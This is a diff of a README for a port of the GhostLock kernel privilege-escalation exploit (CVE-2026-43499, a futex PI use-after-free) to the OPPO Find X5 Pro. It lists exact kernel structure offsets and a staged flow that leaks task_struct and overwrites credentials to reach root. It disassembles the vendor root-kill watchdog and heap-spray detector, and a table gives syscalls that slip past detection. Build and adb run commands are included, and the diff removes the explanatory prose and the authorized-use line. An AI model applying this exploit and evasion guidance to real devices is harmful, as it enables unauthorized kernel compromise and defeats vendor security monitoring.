@@ -1,196 +1,171 @@
-# GhostLock — OPPO Find X5 Pro (PFEM10) — OPlus Watchdog & Heap-Spray Detector
+# GhostLock — OPPO Find X5 Pro (PFEM10)
 
-GhostLock (CVE-2026-43499) port for the OPPO Find X5 Pro on ColorOS 16. Reaches a `uid=0` child process and a loaded `kernelsu.ko`; the root process is intercepted before it can be used. The main content here is the disassembly of the two interception layers.
+GhostLock (CVE-2026-43499) port for the OPPO Find X5 Pro on ColorOS 16. Reaches a `uid=0` child process and a loaded `kernelsu.ko`; the root process is intercepted.
 
 ## Vulnerability
 
-**CVE-2026-43499** — Futex PI (Priority Inheritance) Use-After-Free.
+**CVE-2026-43499** — futex PI use-after-free. `remove_waiter()` clears `current->pi_blocked_on` when `current` is the requeuer, on the `-EDEADLK` rollback path of `rt_mutex_start_proxy_lock()`.
 
-`remove_waiter()` clears `current->pi_blocked_on` when `current` is the *requeuer* rather than the waiter, on the `-EDEADLK` rollback path of `rt_mutex_start_proxy_lock()`. The waiter is left pointing into a popped stack frame.
-
-Unpatched on this device: `remove_waiter` at `0xffffffc0081ed254`, pre-fix shape.
+`remove_waiter` @ `0xffffffc0081ed254` — pre-fix shape.
 
 ## Device
 
-| Field | Value |
-|-------|-------|
+| | |
+|---|---|
 | Device | OPPO Find X5 Pro (PFEM10) |
-| SoC | SM8450 (waipio) / Adreno 730 |
+| SoC | SM8450 / Adreno 730 |
 | OS | ColorOS 16.0.3.520 (CN01) |
 | Kernel | `5.10.236-android12-9-o-gaf2075ad2c06` |
 | Bootloader | locked, green |
-| VA_BITS | 39 (`KIMAGE_TEXT_BASE = 0xffffffc008000000`) |
+| VA_BITS | 39 — `KIMAGE_TEXT_BASE = 0xffffffc008000000` |
 
 ## Status
 
-| Stage | Result |
-|-------|--------|
+| Stage | |
+|---|---|
 | Compact waiter trigger (`CMP_REQUEUE_PI` → `EDEADLK`) | works |
 | `task_struct` leak (perf) | works |
-| PI write primitive (8-byte; value = `0` or a valid kernel address) | works |
-| `task+0x778` / `task+0x780` writes land, target shows `Uid=root` | works |
-| `kernelsu.ko` loaded (`Live` in `/proc/modules`) | works |
-| Root process survives | **no** |
-| Path A (UMH / `modprobe_path`) | unavailable — `CONFIG_STATIC_USERMODEHELPER_PATH=""` |
+| PI write (8-byte; value = `0` or a valid kernel address) | works |
+| `task+0x778` / `task+0x780` → `Uid=root` | works |
+| `kernelsu.ko` loaded | works |
+| Root process survives | no |
+| Path A (UMH / `modprobe_path`) | `STATIC_USERMODEHELPER_PATH=""` |
 
-`kernelsu.ko` is a KMI `android12-5.10` module. Its `5.10.252-dirty` vermagic is the upstream build kernel and does not prevent loading: the module's `__versions` section is empty, so `same_magic()` compares only the fields after the first space.
+## Offsets
+
+`task_struct`
+
+| Field | Offset |
+|---|---|
+| `real_cred` / `cred` | `0x778` / `0x780` |
+| cached `syscallno` | `0xdf8` |
+| cached `uid` / `euid` / `gid` / `egid` | `0xe00` / `0xe08` / `0xe10` / `0xe18` |
+
+`thread_info`
+
+| Field | Offset |
+|---|---|
+| `flags` | `0x0` |
+| `addr_limit` | `0x8` |
+| `ttbr0` | `0x10` |
+| `preempt_count` | `0x18` |
+
+`cred`
+
+| Field | Offset | Field | Offset |
+|---|---|---|---|
+| `uid` | `0x4` | `cap_inheritable` | `0x28` |
+| `gid` | `0x8` | `cap_permitted` | `0x30` |
+| `suid` | `0xc` | `cap_effective` | `0x38` |
+| `sgid` | `0x10` | `cap_bset` | `0x40` |
+| `euid` | `0x14` | `cap_ambient` | `0x48` |
+| `egid` | `0x18` | | |
+| `fsuid` / `fsgid` | `0x1c` / `0x20` | | |
 
 ## Exploit Flow
 
 ```
-LT#2        leak target task_struct (perf) → file
-W7 stage 1  write task+0x778 = init_cred alias   → target shows "Uid=root"
-W7 stage 2  write task+0x780 = init_cred alias
-W7 stage 3  zero-write init_cred+8 (refcount fix)
-exec        memfd_exec("ksud late-load")         → kernelsu ... Live
+LT#2        perf leak target task_struct → file
+W7 stage 1  task+0x778 = init_cred alias        → "Uid=root"
+W7 stage 2  task+0x780 = init_cred alias
+W7 stage 3  zero-write init_cred+8
+exec        memfd_exec("ksud late-load")        → kernelsu ... Live
 ```
 
-### Stage 1 — task leak
-
-`perf_event_open` with `PERF_TYPE_SOFTWARE` / `PERF_COUNT_SW_CPU_CLOCK`, `PERF_SAMPLE_REGS_INTR` (all 32 GPRs), `exclude_user=1`. The most-voted direct-map pointer across samples is the calling task's `task_struct`.
-
-```
-perf_event_paranoid = -1        # unprivileged on this device
-accept range: [0xffffff8400000000, 0xffffff90000000)
-reject if votes < 15% of samples
-```
-
-An out-of-range value that passed the lower bound has previously driven a zero-write into the kernel image → reboot.
-
-### Stage 2 — the write
-
-`run_w7()` writes `task + V12_W7_OFF`. `target_task` is read from a plain-text file (arithmetic base + range check only), so a compile-time constant can be substituted.
-
-Writing `task->cred` and `task->real_cred` to the `init_cred` physmap alias yields full capabilities and `uid=0`.
+perf leak: `PERF_TYPE_SOFTWARE` / `PERF_COUNT_SW_CPU_CLOCK`, `PERF_SAMPLE_REGS_INTR`, `exclude_user=1`.
+Accept `[0xffffff8400000000, 0xffffff90000000)`, votes ≥ 15%.
 
 ## Watchdog — `oplus_security_guard.ko`
 
-Vendor module, not in vmlinux. `.text` 0xfe0, `.data..ro_after_init` 1 byte.
-
-### Per-task credential cache
-
-`oplus_root_check_pre_handler` runs on `sys_enter` and caches four IDs plus the syscall number inside `task_struct`:
-
-| Field | Offset |
-|-------|--------|
-| `syscallno` | `task+0xdf8` |
-| `uid` | `task+0xe00` |
-| `euid` | `task+0xe08` |
-| `gid` | `task+0xe10` |
-| `egid` | `task+0xe18` |
+`sys_enter` cache:
 
 ```asm
-ldrsw x8, [x1, #0x118]      ; regs->syscallno
-mrs   x9, sp_el0            ; current
-ldr   x10, [x9, #0x780]     ; current->cred
+ldrsw x8, [x1, #0x118]          ; regs->syscallno
+mrs   x9, sp_el0                ; current
+ldr   x10, [x9, #0x780]         ; cred
 str   x8,  [x9, #0xdf8]
-ldr   w8,  [x10, #4]  ; cred->uid   → str x8, [x9, #0xe00]
-ldr   w8,  [x10, #0x14] ; cred->euid → str x8, [x9, #0xe08]
-ldr   w8,  [x10, #8]  ; cred->gid   → str x8, [x9, #0xe10]
-ldr   w8,  [x10, #0x18] ; cred->egid → str x8, [x9, #0xe18]
+ldr   w8,  [x10, #4]    → str x8, [x9, #0xe00]   ; uid
+ldr   w8,  [x10, #0x14] → str x8, [x9, #0xe08]   ; euid
+ldr   w8,  [x10, #8]    → str x8, [x9, #0xe10]   ; gid
+ldr   w8,  [x10, #0x18] → str x8, [x9, #0xe18]   ; egid
 ```
 
-### Kill condition
-
-`oplus_root_check_post_handler` on `sys_exit`. Only `uid` / `euid` / `gid` / `egid` are compared — capabilities are never read.
+`sys_exit` check:
 
 ```asm
-ldr   x0,  [x8, #0xe00]       ; cached uid
-cbz   x0, #0x48c              ; cached uid == 0 → return
-adrp  x9, #0 ; ldrb w9, [x9]  ; g_boot_state
-tbnz  w9, #0, #0x48c          ; is_unlocked → return
-ldr   x9,  [x8, #0x780]       ; cred
-ldr   w3,  [x8, #0xdf8]       ; cached syscallno
-cmp   x0, w10 ; b.hi #0x468   ; uid descending → kill path
-...                           ; euid / gid / egid, same shape
+ldr   x0,  [x8, #0xe00]         ; cached uid
+cbz   x0, #0x48c                ; cached uid == 0 → return
+adrp  x9, #0 ; ldrb w9, [x9]    ; g_boot_state
+tbnz  w9, #0, #0x48c            ; is_unlocked → return
+ldr   x9,  [x8, #0x780]         ; cred
+ldr   w3,  [x8, #0xdf8]         ; cached syscallno
+cmp   x0, w10 ; b.hi #0x468     ; uid descending → kill path
+                                ; euid / gid / egid, same shape
+ldr   x9,  [x8, #8]             ; addr_limit
+cmp   x9,  #0x8000000001
+b.lo  #0x48c                    ; addr_limit != KERNEL_DS → return
+sub   w9,  w3, #0x8f            ; syscallno - 143
+cmp   w9,  #0x47
+b.hi  #0x4a0                    ; outside 143..214 → kill
+ldrsw x12, [x10, x9, lsl #2]    ; jmp table @ .rodata+0
+br    x11
+0x48c: ret
+0x4a0: bl oplus_root_check_succ ; printk + kevent_send_to_user
+       bl oplus_root_killed     ; printk + do_exit(SIGKILL)
 ```
 
-```asm
-oplus_root_check_succ   ; printk + kevent_send_to_user   (report)
-oplus_root_killed       ; printk + do_exit(SIGKILL)      (calling task only; no panic)
-```
+`g_boot_state` — 1 byte `.data..ro_after_init`, set at module init from `verified_bootstate` via `strstr`. `is_unlocked()` = `LDRB` + `RET`.
 
-`g_boot_state` is a 1-byte `.data..ro_after_init` value derived at module init from the `verified_bootstate` symbol via `strstr`. `is_unlocked()` is a bare `LDRB` + `RET`.
+Module VA writes fault (`CONFIG_STRICT_MODULE_RWX=y`) — use the physmap alias `0xffffff80…`.
 
-Writing the module VA faults (`CONFIG_STRICT_MODULE_RWX=y`); a write must go to the physmap alias (`0xffffff80…`).
+Report payload: `$$sys_call_number@@%d`, `$$set_id_flag@@%d`, `$$addr_limit@@%lx`, `$$enforce@@%d`.
 
-The report payload contains `$$sys_call_number@@%d`, `$$set_id_flag@@%d`, `$$addr_limit@@%lx`, `$$enforce@@%d`.
+### Exempt syscalls — `.rodata+0`, indices 143–214
 
-### Exempt syscalls
+| 143 `setgid` | 144 `setreuid` | 145 `setuid` | 146 `setresuid` |
+|---|---|---|---|
+| 147 `getresuid` | 149 `getresgid` | 203 `getsockname` | 204 `getpeername` |
+| 208 `getsockopt` | 210 `sendmsg` | 213 `brk` | 214 `munmap` |
 
-The kill path dispatches through a 72-entry jump table in `.rodata` covering syscall numbers 143–214. Twelve entries return without killing:
-
-| Nr | Syscall | Nr | Syscall |
-|----|---------|----|---------|
-| 143 | `setgid` | 147 | `getresuid` |
-| 144 | `setreuid` | 149 | `getresgid` |
-| 145 | `setuid` | 203 | `getsockname` |
-| 146 | `setresuid` | 204 | `getpeername` |
-| 208 | `getsockopt` | 210 | `sendmsg` |
-| 213 | `brk` | 214 | `munmap` |
-
-The remaining 60 entries report and kill. A legitimate `setresuid(0,0,0)` is tolerated; an in-place `cred` overwrite is not, because it happens under a syscall that is not on the list.
-
-### `task+8` is `thread_info.addr_limit`
-
-Last gate before the dispatch table:
-
-```asm
-0x454: ldr   x9, [x8, #8]
-0x458: mov   x10, #1
-0x45c: movk  x10, #0x80, lsl #32    ; 0x8000000001
-0x460: cmp   x9, x10
-0x464: b.lo  #0x48c                 ; below TASK_SIZE+1 → return
-```
-
-`thread_info` on this build is `{ flags@0x0, addr_limit@0x8, ttbr0@0x10, preempt_count@0x18 }` (`CONFIG_SET_FS=y`). The constant is `USER_DS = TASK_SIZE - 1 = 0x7fffffffff` for VA_BITS=39, so the handler returns early unless `addr_limit == KERNEL_DS`.
-
-Offset evidence: `el1_sync+0x40` (`kernel_entry`) saves it to `pt_regs.orig_addr_limit` (`sp+0x120`) and replaces it with `USER_DS`; the `set_fs()` family — `copy_{to,from}_user_nofault`, `strn{cpy,len}_user_nofault` — writes `[current+8]`; the module's own report payload carries `$$addr_limit@@%lx$$`.
+Remaining 60 entries → report + kill.
 
 ## Heap-Spray Detector — `oplus_secure_harden.ko`
 
-Five kretprobes. The variable names are misleading; the hooked functions are resolved by name at runtime:
-
-| kretprobe variable | Hooks | Filter |
+| kretprobe | Hooks | Filter |
 |---|---|---|
 | `socket_kretprobe` | `ip_setsockopt` | `regs[1]` ∈ {41, 42, 48} |
 | `socket_ip6_kretprobe` | `do_ipv6_setsockopt` | `regs[1]` ∈ {41, 42} |
-| `cpuinfo_kretprobe` | `cpuinfo_open` | none |
-| `setxattr_kretprobe` | `setxattr` | none |
-| `sepolicy_reload_kretprobe` | `spolicy_reload` | none |
+| `cpuinfo_kretprobe` | `cpuinfo_open` | — |
+| `setxattr_kretprobe` | `setxattr` | — |
+| `sepolicy_reload_kretprobe` | `spolicy_reload` | — |
 
 ```asm
-; entry_handler_socket
-ldr  w8, [x1, #8]      ; regs[1] — 2nd argument of the hooked function
-cmp  w8, #0x29         ; 41 IP_MSFILTER
-b.eq  -> report
-cmp  w8, #0x30         ; 48 MCAST_MSFILTER
-b.eq  -> report
-cmp  w8, #0x2a         ; 42 MCAST_JOIN_GROUP
-b.ne #0xd68            ; anything else → return: no call, no counter
+ldr  w8, [x1, #8]       ; regs[1]
+cmp  w8, #0x29          ; 41 IP_MSFILTER
+b.eq #0xd58
+cmp  w8, #0x30          ; 48 MCAST_MSFILTER
+b.eq #0xd60
+cmp  w8, #0x2a          ; 42 MCAST_JOIN_GROUP
+b.ne #0xd68             ; else → return, no call
 bl   oplus_heapspray_check
 ```
 
-41 / 42 / 48 are `IP_MSFILTER` / `MCAST_JOIN_GROUP` / `MCAST_MSFILTER`, matching the module's own error strings (`Detected the MCAST_JOIN_GROUP_IP4 may be abnormal…`).
+`entry_handler_setxattr` → `oplus_heapspray_check(7)`, `entry_handler_cpuinfo` → `(6)`, both unconditional.
 
-`oplus_heapspray_check` holds four counters (`heapspary_ip4`, `heapspary_ip6`, `heapspary_xttr`, `heapspary_cpuinfo`), calls `ktime_get_real_ts64` for a time-delta test, has seven report sites (`snprintf` + `printk` + `kevent_send_to_user`), and is itself gated on `verified_bootstate`.
-
-Two caveats: the name-table → kretprobe-struct mapping is inferred from names; and on `ip_setsockopt(sk, level, optname, …)` the second argument is `level`, not `optname` (and `41 == SOL_IPV6`). Which syscall and which argument are therefore not fully resolved.
+`oplus_heapspray_check` — counters `heapspary_ip4` / `ip6` / `xttr` / `cpuinfo`, `ktime_get_real_ts64` delta, 7 report sites (`snprintf` + `printk` + `kevent_send_to_user`), gated on `verified_bootstate`.
 
 ### Avoidance
 
-| Primitive | Note |
+| Primitive | |
 |---|---|
-| `setsockopt` optname 46 (`MCAST_JOIN_SOURCE_GROUP`) | falls through `b.ne` if the filter reads `optname` |
-| `setsockopt` with level `SOL_IPV6` (41) | avoid if the filter reads `level` |
+| `setsockopt` optname 46 `MCAST_JOIN_SOURCE_GROUP` | not filtered |
+| `setsockopt` level `SOL_IPV6` (41) | not filtered if filter reads `level` |
 | `setxattr` | always counted |
 | `/proc/cpuinfo` | always counted |
-| `socket()` / `socketpair()` | not in the name table |
-| `sendmsg`, `pipe`, `memfd`, `add_key`, `io_uring`, page faults | not in the name table |
+| `socket()` / `socketpair()` | not hooked |
+| `sendmsg`, `pipe`, `memfd`, `add_key`, `io_uring`, mmap | not hooked |
 
-A mass `socket()` spray does not trip this detector.
-
-## Config (relevant)
+## Config
 
 ```
 CONFIG_CFI_CLANG=y
@@ -216,7 +191,7 @@ CONFIG_ANDROID_BINDER_IPC=y
 CONFIG_KASAN=y
 ```
 
-`perf_event_paranoid = -1` at runtime.
+`perf_event_paranoid = -1`
 
 ## Build
 
@@ -234,49 +209,26 @@ adb shell chmod 755 /data/local/tmp/e
 adb shell /data/local/tmp/e
 ```
 
-## Repository layout
+## Files
 
 ```
-ghostlock-pfem10/
-├── modules/                          KernelSU, as pulled from the device
-│   ├── kernelsu.ko                   KMI android12-5.10, vermagic=5.10.252-dirty
-│   ├── ksud
-│   └── libkernelsu.so
-├── src/
-│   ├── core/
-│   │   ├── exploit.c                 trigger, pselect route, PI write (run_w7), cred stage
-│   │   ├── payload.c                 spray payload, KernelSnitch, slab drain
-│   │   ├── payload.h
-│   │   └── fdset_map.h               pselect stack_fds layout map
-│   └── devices/pfem10/
-│       └── pfem10_target.h           per-device offsets (STRUCT_OFFSETS_5_10, physmap aliases)
-├── tools/
-│   ├── kdis.py                       disassemble the kernel Image (capstone + kallsyms)
-│   ├── kdis_ko.py                    disassemble .ko modules, with relocation annotation
-│   ├── find_task_off.py              enumerate all [current+off] readers/writers in the Image
-│   └── slide_resolve.py              majority-vote slide resolver from sampled kernel IPs
-├── artifacts/
-│   ├── guard_disasm.txt              guard handlers, disassembled
-│   ├── guard_exempt_table.txt        the 72-entry kill-path jump table, decoded
-│   └── harden_disasm.txt             the five kretprobe entry handlers
-├── NOTICE.md
-└── README.md
+modules/                  kernelsu.ko (KMI android12-5.10)  ksud  libkernelsu.so
+src/core/                 exploit.c  payload.c  payload.h  fdset_map.h
+src/devices/pfem10/       pfem10_target.h
+tools/                    kdis.py  kdis_ko.py  find_task_off.py  slide_resolve.py
+artifacts/                guard_disasm.txt  guard_exempt_table.txt  harden_disasm.txt
 ```
 
-The vendor modules analysed here (`oplus_security_guard.ko`, `oplus_secure_harden.ko`, `oplus_security_keventupload.ko`, `oplus_secure_common.ko`) are **not** redistributed. Pull them from your own device's `/vendor/lib/modules/` and run the commands in `NOTICE.md` to regenerate the artifacts.
-
-`tools/kdis_ko.py` matches RELA sections by `sh_info`, not by name. On these builds the `.text` relocations live in an oddly-named section (`.rela.text.<function_name>`), so a name-based lookup returns zero entries and `bl` targets appear unresolved.
+`tools/kdis_ko.py` — RELA matched by `sh_info`; on these builds `.text` relocs live in `.rela.text.<func>`, so name-based lookup returns nothing.
 
 ## Related
 
-| Project | Relevance |
+| Project | |
 |---|---|
-| [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) | reference implementation; 5.10 compact-waiter support |
+| [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) | reference implementation; 5.10 compact waiter |
 | [issue #31](https://github.com/JoinChang/ghostlock-oneplus/issues/31) | OPPO Reno10 Pro+ (CPH2521), SM8475, 5.10.236 |
 | [NebuSec CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) | original GhostLock research |
 
 ## License
 
 GPL-3.0 — see [LICENSE](LICENSE).
-
-For authorized security research and educational purposes only.
